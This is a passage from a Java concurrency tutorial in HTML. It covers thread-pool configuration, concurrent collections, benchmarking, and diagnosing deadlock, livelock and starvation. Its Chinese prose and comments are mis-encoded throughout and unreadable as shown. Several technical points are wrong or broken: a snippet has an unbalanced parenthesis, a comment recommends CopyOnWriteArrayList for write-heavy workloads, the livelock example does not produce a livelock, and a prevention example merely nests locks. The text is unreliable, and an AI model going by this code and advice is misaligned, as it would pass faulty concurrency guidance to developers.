<span class="hljs-comment">// éœ€è¦ä¼˜å…ˆçº§ï¼Œä½¿ç”¨ä¼˜å…ˆçº§é˜Ÿåˆ—</span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityBlockingQueue</span>&lt;&gt;(<span class="hljs-number">100</span>, 
        (r1, r2) -&gt; ((Task) r1).getPriority() - ((Task) r2).getPriority())
    )
);
</code></pre>
<h5 data-id="heading-122">5.2.3 ç›‘æ§å’Œè°ƒä¼˜</h5>
<p>å®šæœŸç›‘æ§çº¿ç¨‹æ± çš„çŠ¶æ€ï¼ŒåŠæ—¶è°ƒæ•´å‚æ•°ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadPoolMonitor</span> {
    <span class="hljs-keyword">private</span> ThreadPoolExecutor executor;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">monitor</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"æ ¸å¿ƒçº¿ç¨‹æ•°: "</span> + executor.getCorePoolSize());
        System.out.println(<span class="hljs-string">"å½“å‰çº¿ç¨‹æ•°: "</span> + executor.getPoolSize());
        System.out.println(<span class="hljs-string">"æ´»è·ƒçº¿ç¨‹æ•°: "</span> + executor.getActiveCount());
        System.out.println(<span class="hljs-string">"é˜Ÿåˆ—å¤§å°: "</span> + executor.getQueue().size());
        System.out.println(<span class="hljs-string">"å·²å®Œæˆä»»åŠ¡æ•°: "</span> + executor.getCompletedTaskCount());
        
        <span class="hljs-comment">// å¦‚æœé˜Ÿåˆ—ç§¯å‹ä¸¥é‡ï¼Œè€ƒè™‘å¢åŠ çº¿ç¨‹æ•°æˆ–é˜Ÿåˆ—å®¹é‡</span>
        <span class="hljs-keyword">if</span> (executor.getQueue().size() &gt; <span class="hljs-number">1000</span>) {
            System.out.println(<span class="hljs-string">"è­¦å‘Šï¼šé˜Ÿåˆ—ç§¯å‹ä¸¥é‡ï¼"</span>);
        }
    }
}
</code></pre>
<h4 data-id="heading-123">5.3 å¹¶å‘é›†åˆä¼˜åŒ–</h4>
<h5 data-id="heading-124">5.3.1 é€‰æ‹©åˆé€‚çš„å¹¶å‘é›†åˆ</h5>
<p>æ ¹æ®ä½¿ç”¨åœºæ™¯é€‰æ‹©åˆé€‚çš„å¹¶å‘é›†åˆï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è¯»å¤šå†™å°‘ï¼šä½¿ç”¨ConcurrentHashMap</span>
ConcurrentHashMap&lt;String, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();

<span class="hljs-comment">// å†™å¤šè¯»å°‘ï¼šä½¿ç”¨CopyOnWriteArrayList</span>
CopyOnWriteArrayList&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CopyOnWriteArrayList</span>&lt;&gt;();

<span class="hljs-comment">// éœ€è¦é˜»å¡æ“ä½œï¼šä½¿ç”¨BlockingQueue</span>
BlockingQueue&lt;String&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="hljs-number">100</span>);
</code></pre>
<h5 data-id="heading-125">5.3.2 é¿å…ä¸å¿…è¦çš„åŒæ­¥</h5>
<p>ä¸è¦åœ¨ä¸å¿…è¦çš„åœ°æ–¹ä½¿ç”¨åŒæ­¥ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šä½¿ç”¨åŒæ­¥é›†åˆ</span>
List&lt;String&gt; list = Collections.synchronizedList(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;());

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šä½¿ç”¨å¹¶å‘é›†åˆ</span>
List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CopyOnWriteArrayList</span>&lt;&gt;();

<span class="hljs-comment">// æˆ–è€…ï¼šå¦‚æœä¸éœ€è¦çº¿ç¨‹å®‰å…¨ï¼Œç›´æ¥ä½¿ç”¨æ™®é€šé›†åˆ</span>
List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <span class="hljs-comment">// å•çº¿ç¨‹ä½¿ç”¨</span>
</code></pre>
<h4 data-id="heading-126">5.4 æ€§èƒ½æµ‹è¯•</h4>
<h5 data-id="heading-127">5.4.1 åŸºå‡†æµ‹è¯•</h5>
<p>ä½¿ç”¨JMHï¼ˆJava Microbenchmark Harnessï¼‰è¿›è¡ŒåŸºå‡†æµ‹è¯•ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@BenchmarkMode(Mode.AverageTime)</span>
<span class="hljs-meta">@OutputTimeUnit(TimeUnit.NANOSECONDS)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PerformanceTest</span> {
    
    <span class="hljs-meta">@Benchmark</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSynchronized</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) {
            <span class="hljs-comment">// æµ‹è¯•ä»£ç </span>
        }
    }
    
    <span class="hljs-meta">@Benchmark</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testLockFree</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æµ‹è¯•æ— é”å®ç°</span>
    }
}
</code></pre>
<h5 data-id="heading-128">5.4.2 å‹åŠ›æµ‹è¯•</h5>
<p>ä½¿ç”¨å·¥å…·è¿›è¡Œå‹åŠ›æµ‹è¯•ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StressTest</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> {
        <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">100</span>);
        <span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">latch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(<span class="hljs-number">1000</span>);
        
        <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
            executor.submit(() -&gt; {
                <span class="hljs-comment">// æ‰§è¡Œæµ‹è¯•ä»£ç </span>
                latch.countDown();
            });
        }
        
        latch.await();
        <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        System.out.println(<span class="hljs-string">"æ€»è€—æ—¶: "</span> + (end - start) + <span class="hljs-string">"ms"</span>);
    }
}
</code></pre>
<h5 data-id="heading-129">5.4.3 æ€§èƒ½åˆ†æå·¥å…·</h5>
<p>ä½¿ç”¨æ€§èƒ½åˆ†æå·¥å…·æ‰¾å‡ºæ€§èƒ½ç“¶é¢ˆï¼š</p>
<ul>
<li><strong>JProfiler</strong>ï¼šå•†ä¸šå·¥å…·ï¼ŒåŠŸèƒ½å¼ºå¤§</li>
<li><strong>VisualVM</strong>ï¼šå…è´¹å·¥å…·ï¼ŒJDKè‡ªå¸¦</li>
<li><strong>JConsole</strong>ï¼šJDKè‡ªå¸¦ï¼Œç®€å•æ˜“ç”¨</li>
</ul>
<h2 data-id="heading-130">6. å¹¶å‘é—®é¢˜è¯Šæ–­</h2>
<h4 data-id="heading-131">6.1 æ­»é”</h4>
<h5 data-id="heading-132">6.1.1 æ­»é”çš„å®šä¹‰</h5>
<p>æ­»é”æ˜¯æŒ‡ä¸¤ä¸ªæˆ–å¤šä¸ªçº¿ç¨‹äº’ç›¸ç­‰å¾…å¯¹æ–¹æŒæœ‰çš„èµ„æºï¼Œå¯¼è‡´æ‰€æœ‰çº¿ç¨‹éƒ½æ— æ³•ç»§ç»­æ‰§è¡Œã€‚</p>
<p><strong>æ­»é”çš„å…¸å‹åœºæ™¯ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// çº¿ç¨‹1æŒæœ‰é”Aï¼Œç­‰å¾…é”B</span>
<span class="hljs-comment">// çº¿ç¨‹2æŒæœ‰é”Bï¼Œç­‰å¾…é”A</span>
<span class="hljs-comment">// ç»“æœï¼šä¸¤ä¸ªçº¿ç¨‹éƒ½æ— æ³•ç»§ç»­æ‰§è¡Œ</span>

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeadlockExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method1</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span> (lock1) {
            System.out.println(<span class="hljs-string">"çº¿ç¨‹1æŒæœ‰lock1"</span>);
            <span class="hljs-keyword">try</span> {
                Thread.sleep(<span class="hljs-number">100</span>);
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                e.printStackTrace();
            }
            <span class="hljs-keyword">synchronized</span> (lock2) {  <span class="hljs-comment">// ç­‰å¾…lock2</span>
                System.out.println(<span class="hljs-string">"çº¿ç¨‹1æŒæœ‰lock2"</span>);
            }
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method2</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span> (lock2) {
            System.out.println(<span class="hljs-string">"çº¿ç¨‹2æŒæœ‰lock2"</span>);
            <span class="hljs-keyword">try</span> {
                Thread.sleep(<span class="hljs-number">100</span>);
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                e.printStackTrace();
            }
            <span class="hljs-keyword">synchronized</span> (lock1) {  <span class="hljs-comment">// ç­‰å¾…lock1</span>
                System.out.println(<span class="hljs-string">"çº¿ç¨‹2æŒæœ‰lock1"</span>);
            }
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">DeadlockExample</span> <span class="hljs-variable">example</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeadlockExample</span>();
        
        <span class="hljs-comment">// çº¿ç¨‹1æ‰§è¡Œmethod1</span>
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; example.method1()).start();
        
        <span class="hljs-comment">// çº¿ç¨‹2æ‰§è¡Œmethod2</span>
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; example.method2()).start();
        
        <span class="hljs-comment">// ç»“æœï¼šä¸¤ä¸ªçº¿ç¨‹äº’ç›¸ç­‰å¾…ï¼Œå‘ç”Ÿæ­»é”</span>
    }
}
</code></pre>
<h5 data-id="heading-133">6.1.2 æ­»é”äº§ç”Ÿçš„æ¡ä»¶</h5>
<p>æ­»é”äº§ç”Ÿçš„å››ä¸ªå¿…è¦æ¡ä»¶ï¼ˆå¿…é¡»åŒæ—¶æ»¡è¶³ï¼‰ï¼š</p>
<ol>
<li><strong>äº’æ–¥æ¡ä»¶</strong>ï¼šèµ„æºä¸èƒ½è¢«å¤šä¸ªçº¿ç¨‹åŒæ—¶ä½¿ç”¨</li>
<li><strong>è¯·æ±‚ä¸ä¿æŒæ¡ä»¶</strong>ï¼šçº¿ç¨‹æŒæœ‰èµ„æºçš„åŒæ—¶è¯·æ±‚å…¶ä»–èµ„æº</li>
<li><strong>ä¸å‰¥å¤ºæ¡ä»¶</strong>ï¼šçº¿ç¨‹å·²è·å¾—çš„èµ„æºä¸èƒ½è¢«å…¶ä»–çº¿ç¨‹å¼ºåˆ¶é‡Šæ”¾</li>
<li><strong>å¾ªç¯ç­‰å¾…æ¡ä»¶</strong>ï¼šå­˜åœ¨ä¸€ä¸ªå¾ªç¯ç­‰å¾…é“¾</li>
</ol>
<h5 data-id="heading-134">6.1.3 æ­»é”çš„æ£€æµ‹</h5>
<p><strong>ä½¿ç”¨jstackæ£€æµ‹æ­»é”ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. æ‰¾åˆ°Javaè¿›ç¨‹ID</span>
jps

<span class="hljs-comment"># 2. ç”Ÿæˆçº¿ç¨‹å †æ ˆ</span>
jstack &lt;pid&gt;

<span class="hljs-comment"># 3. æŸ¥æ‰¾æ­»é”ä¿¡æ¯</span>
<span class="hljs-comment"># è¾“å‡ºä¸­ä¼šæ˜¾ç¤ºï¼š</span>
<span class="hljs-comment"># Found one Java-level deadlock:</span>
<span class="hljs-comment"># ...</span>
</code></pre>
<p><strong>ä½¿ç”¨ä»£ç æ£€æµ‹æ­»é”ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨ThreadMXBeanæ£€æµ‹æ­»é”</span>
<span class="hljs-type">ThreadMXBean</span> <span class="hljs-variable">threadBean</span> <span class="hljs-operator">=</span> ManagementFactory.getThreadMXBean();
<span class="hljs-type">long</span>[] deadlockedThreads = threadBean.findDeadlockedThreads();

<span class="hljs-keyword">if</span> (deadlockedThreads != <span class="hljs-literal">null</span>) {
    ThreadInfo[] threadInfos = threadBean.getThreadInfo(deadlockedThreads);
    System.out.println(<span class="hljs-string">"æ£€æµ‹åˆ°æ­»é”ï¼š"</span>);
    <span class="hljs-keyword">for</span> (ThreadInfo threadInfo : threadInfos) {
        System.out.println(threadInfo.getThreadName());
    }
}
</code></pre>
<h5 data-id="heading-135">6.1.4 æ­»é”çš„é¿å…</h5>
<p><strong>1. é¿å…åµŒå¥—é”</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šåµŒå¥—é”å®¹æ˜“å¯¼è‡´æ­»é”</span>
<span class="hljs-keyword">synchronized</span> (lock1) {
    <span class="hljs-keyword">synchronized</span> (lock2) {
        <span class="hljs-comment">// ä»£ç </span>
    }
}

<span class="hljs-comment">// å¥½çš„åšæ³•ï¼šé¿å…åµŒå¥—ï¼Œæˆ–è€…ä½¿ç”¨é”é¡ºåº</span>
</code></pre>
<p><strong>2. ä½¿ç”¨é”é¡ºåº</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç¡®ä¿æ‰€æœ‰çº¿ç¨‹ä»¥ç›¸åŒçš„é¡ºåºè·å–é”</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockOrderExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method1</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span> (lock1) {  <span class="hljs-comment">// å…ˆè·å–lock1</span>
            <span class="hljs-keyword">synchronized</span> (lock2) {  <span class="hljs-comment">// å†è·å–lock2</span>
                <span class="hljs-comment">// ä»£ç </span>
            }
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method2</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span> (lock1) {  <span class="hljs-comment">// å…ˆè·å–lock1ï¼ˆä¸method1é¡ºåºä¸€è‡´ï¼‰</span>
            <span class="hljs-keyword">synchronized</span> (lock2) {  <span class="hljs-comment">// å†è·å–lock2</span>
                <span class="hljs-comment">// ä»£ç </span>
            }
        }
    }
}
</code></pre>
<p><strong>3. ä½¿ç”¨è¶…æ—¶é”</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨tryLock()è®¾ç½®è¶…æ—¶</span>
<span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
<span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">if</span> (lock1.tryLock(<span class="hljs-number">100</span>, TimeUnit.MILLISECONDS)) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">if</span> (lock2.tryLock(<span class="hljs-number">100</span>, TimeUnit.MILLISECONDS)) {
                    <span class="hljs-keyword">try</span> {
                        <span class="hljs-comment">// ä»£ç </span>
                    } <span class="hljs-keyword">finally</span> {
                        lock2.unlock();
                    }
                }
            } <span class="hljs-keyword">finally</span> {
                lock1.unlock();
            }
        }
    } <span class="hljs-keyword">catch</span> (InterruptedException e) {
        e.printStackTrace();
    }
}
</code></pre>
<h5 data-id="heading-136">6.1.5 æ­»é”çš„é¢„é˜²</h5>
<p><strong>1. ç ´åè¯·æ±‚ä¸ä¿æŒæ¡ä»¶</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸€æ¬¡æ€§è·å–æ‰€æœ‰éœ€è¦çš„é”</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span> (lock1) {
        <span class="hljs-keyword">synchronized</span> (lock2) {
            <span class="hljs-comment">// ä¸€æ¬¡æ€§è·å–æ‰€æœ‰é”</span>
        }
    }
}
</code></pre>
<p><strong>2. ç ´åä¸å‰¥å¤ºæ¡ä»¶</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨å¯ä¸­æ–­çš„é”</span>
<span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">try</span> {
        lock.lockInterruptibly();  <span class="hljs-comment">// å¯ä¸­æ–­</span>
        <span class="hljs-comment">// ä»£ç </span>
    } <span class="hljs-keyword">catch</span> (InterruptedException e) {
        <span class="hljs-comment">// å¤„ç†ä¸­æ–­</span>
    } <span class="hljs-keyword">finally</span> {
        <span class="hljs-keyword">if</span> (lock.isHeldByCurrentThread()) {
            lock.unlock();
        }
    }
}
</code></pre>
<p><strong>3. ç ´åå¾ªç¯ç­‰å¾…æ¡ä»¶</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨é”é¡ºåºï¼Œé¿å…å¾ªç¯ç­‰å¾…</span>
<span class="hljs-comment">// æ‰€æœ‰çº¿ç¨‹æŒ‰ç…§ç›¸åŒçš„é¡ºåºè·å–é”</span>
</code></pre>
<h5 data-id="heading-137">6.1.6 æ­»é”çš„æ¢å¤</h5>
<p>æ­»é”æ¢å¤é€šå¸¸éœ€è¦äººå·¥å¹²é¢„æˆ–ç³»ç»Ÿé‡å¯ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ£€æµ‹åˆ°æ­»é”åï¼Œå¯ä»¥å°è¯•ä¸­æ–­çº¿ç¨‹</span>
<span class="hljs-type">ThreadMXBean</span> <span class="hljs-variable">threadBean</span> <span class="hljs-operator">=</span> ManagementFactory.getThreadMXBean();
<span class="hljs-type">long</span>[] deadlockedThreads = threadBean.findDeadlockedThreads();

<span class="hljs-keyword">if</span> (deadlockedThreads != <span class="hljs-literal">null</span>) {
    ThreadInfo[] threadInfos = threadBean.getThreadInfo(deadlockedThreads);
    <span class="hljs-keyword">for</span> (ThreadInfo threadInfo : threadInfos) {
        <span class="hljs-comment">// å°è¯•ä¸­æ–­æ­»é”çº¿ç¨‹ï¼ˆå¯èƒ½æ— æ•ˆï¼‰</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> findThread(threadInfo.getThreadId());
        <span class="hljs-keyword">if</span> (thread != <span class="hljs-literal">null</span>) {
            thread.interrupt();
        }
    }
}
</code></pre>
<h4 data-id="heading-138">6.2 æ´»é”</h4>
<h5 data-id="heading-139">6.2.1 æ´»é”çš„å®šä¹‰</h5>
<p>æ´»é”æ˜¯æŒ‡çº¿ç¨‹è™½ç„¶æ²¡æœ‰è¢«é˜»å¡ï¼Œä½†æ˜¯ç”±äºä¸æ–­é‡è¯•ç›¸åŒçš„æ“ä½œï¼Œå¯¼è‡´æ— æ³•ç»§ç»­æ‰§è¡Œã€‚</p>
<p><strong>æ´»é”çš„ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LivelockExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method1</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">while</span> (flag) {
            <span class="hljs-comment">// ç­‰å¾…flagå˜ä¸ºfalse</span>
            <span class="hljs-keyword">if</span> (!flag) {
                flag = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// åˆè®¾ç½®ä¸ºtrue</span>
                <span class="hljs-keyword">break</span>;
            }
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method2</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">while</span> (!flag) {
            <span class="hljs-comment">// ç­‰å¾…flagå˜ä¸ºtrue</span>
            <span class="hljs-keyword">if</span> (flag) {
                flag = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// åˆè®¾ç½®ä¸ºfalse</span>
                <span class="hljs-keyword">break</span>;
            }
        }
    }
    
    <span class="hljs-comment">// ä¸¤ä¸ªçº¿ç¨‹ä¸æ–­äº’ç›¸ä¿®æ”¹flagï¼Œå¯¼è‡´æ´»é”</span>
}
</code></pre>
<h5 data-id="heading-140">6.2.2 æ´»é”çš„è§£å†³</h5>
<p><strong>1. å¼•å…¥éšæœºæ€§</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åœ¨é‡è¯•æ—¶å¼•å…¥éšæœºå»¶è¿Ÿ</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-type">Random</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();
    <span class="hljs-keyword">while</span> (condition) {
        <span class="hljs-keyword">if</span> (tryOperation()) {
            <span class="hljs-keyword">break</span>;
        }
        <span class="hljs-comment">// éšæœºå»¶è¿Ÿï¼Œé¿å…åŒæ—¶é‡è¯•</span>
        <span class="hljs-keyword">try</span> {
            Thread.sleep(random.nextInt(<span class="hljs-number">100</span>));
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
</code></pre>
<p><strong>2. ä½¿ç”¨é€€é¿ç­–ç•¥</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨æŒ‡æ•°é€€é¿</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">delay</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;
    <span class="hljs-keyword">while</span> (condition) {
        <span class="hljs-keyword">if</span> (tryOperation()) {
            <span class="hljs-keyword">break</span>;
        }
        <span class="hljs-keyword">try</span> {
            Thread.sleep(delay);
            delay = Math.min(delay * <span class="hljs-number">2</span>, <span class="hljs-number">1000</span>);  <span class="hljs-comment">// æŒ‡æ•°é€€é¿ï¼Œæœ€å¤§1ç§’</span>
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
</code></pre>
<h4 data-id="heading-141">6.3 é¥¥é¥¿</h4>
<h5 data-id="heading-142">6.3.1 é¥¥é¥¿çš„å®šä¹‰</h5>
<p>é¥¥é¥¿æ˜¯æŒ‡æŸäº›çº¿ç¨‹ç”±äºä¼˜å…ˆçº§ä½æˆ–èµ„æºç«äº‰æ¿€çƒˆï¼Œé•¿æ—¶é—´æ— æ³•è·å¾—æ‰§è¡Œæœºä¼šã€‚</p>
<p><strong>é¥¥é¥¿çš„ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é«˜ä¼˜å…ˆçº§çº¿ç¨‹ä¸€ç›´å ç”¨CPUï¼Œä½ä¼˜å…ˆçº§çº¿ç¨‹æ— æ³•æ‰§è¡Œ</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StarvationExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// é«˜ä¼˜å…ˆçº§çº¿ç¨‹</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">highPriority</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
                <span class="hljs-comment">// ä¸€ç›´æ‰§è¡Œï¼Œå ç”¨CPU</span>
            }
        });
        highPriority.setPriority(Thread.MAX_PRIORITY);
        highPriority.start();
        
        <span class="hljs-comment">// ä½ä¼˜å…ˆçº§çº¿ç¨‹</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">lowPriority</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            System.out.println(<span class="hljs-string">"ä½ä¼˜å…ˆçº§çº¿ç¨‹æ‰§è¡Œ"</span>);
        });
        lowPriority.setPriority(Thread.MIN_PRIORITY);
        lowPriority.start();
        
        <span class="hljs-comment">// ä½ä¼˜å…ˆçº§çº¿ç¨‹å¯èƒ½ä¸€ç›´æ— æ³•æ‰§è¡Œ</span>
    }
}
</code></pre>
<h5 data-id="heading-143">6.3.2 é¥¥é¥¿çš„åŸå› </h5>
<ol>
<li><strong>çº¿ç¨‹ä¼˜å…ˆçº§è®¾ç½®ä¸å½“</strong>ï¼šé«˜ä¼˜å…ˆçº§çº¿ç¨‹ä¸€ç›´å ç”¨CPU</li>
<li><strong>é”ç«äº‰æ¿€çƒˆ</strong>ï¼šæŸäº›çº¿ç¨‹ä¸€ç›´æ— æ³•è·å–é”</li>
<li><strong>èµ„æºåˆ†é…ä¸å…¬å¹³</strong>ï¼šæŸäº›çº¿ç¨‹æ€»æ˜¯ä¼˜å…ˆè·å¾—èµ„æº</li>
</ol>
<h5 data-id="heading-144">6.3.3 é¥¥é¥¿çš„è§£å†³</h5>
<p><strong>1. ä½¿ç”¨å…¬å¹³é”</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨å…¬å¹³é”ï¼Œç¡®ä¿çº¿ç¨‹æŒ‰é¡ºåºè·å–é”</span>
<span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">true</span>);  <span class="hljs-comment">// å…¬å¹³é”</span>

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// ä»£ç </span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}
</code></pre>
